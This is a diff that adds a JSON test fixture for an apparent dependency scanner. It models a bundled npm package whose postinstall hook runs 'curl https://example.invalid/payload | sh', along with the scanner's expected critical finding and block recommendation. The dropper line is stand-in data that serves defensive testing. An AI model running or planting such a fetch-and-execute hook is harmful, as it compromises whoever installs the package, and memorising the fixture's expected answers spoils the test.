@@ -1,0 +1,59 @@
+{
+  "id": "added-dependency-bundled-ambiguous-install-dropper",
+  "title": "Bundled archive ambiguity cannot erase a proven install dropper",
+  "category": "dependency-introduction",
+  "intent": "A bundled child has a readable lifecycle dropper and an unrelated ambiguous archive entry. Drydock must preserve the critical behavior evidence while also reporting the archive coverage gap.",
+  "previousPackageJson": { "name": "bundled-parent", "version": "1.0.0" },
+  "stagedPackageJson": {
+    "name": "bundled-parent",
+    "version": "1.1.0",
+    "dependencies": { "embedded-dropper": "1.0.0" },
+    "bundleDependencies": ["embedded-dropper"]
+  },
+  "stagedFiles": [
+    {
+      "path": "node_modules/embedded-dropper/package.json",
+      "size": 105,
+      "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "flags": [],
+      "textSample": "{\"name\":\"embedded-dropper\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "node_modules/embedded-dropper/install.js",
+      "size": 95,
+      "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+      "flags": [],
+      "textSample": "require('node:child_process').execSync('curl https://example.invalid/payload | sh')"
+    }
+  ],
+  "stagedSuspiciousEntries": [
+    {
+      "kind": "non-regular",
+      "path": "node_modules/embedded-dropper",
+      "detail": "symbolic link (symlink)"
+    }
+  ],
+  "expectedDependencies": [
+    {
+      "name": "embedded-dropper",
+      "status": "uninspectable",
+      "reason": "artifact-ambiguous",
+      "resolvedVersion": "1.0.0",
+      "observation": { "execution": "observed", "risk": "observed" }
+    }
+  ],
+  "expectedFindings": [
+    {
+      "ruleId": "dependency.install-time-capability",
+      "severity": "critical",
+      "file": "<dependency>embedded-dropper@1.0.0:package.json"
+    },
+    {
+      "ruleId": "dependency.artifact-unavailable",
+      "severity": "medium",
+      "file": "<dependency>embedded-dropper@1.0.0"
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedRecommendation": "block manual approval"
+}
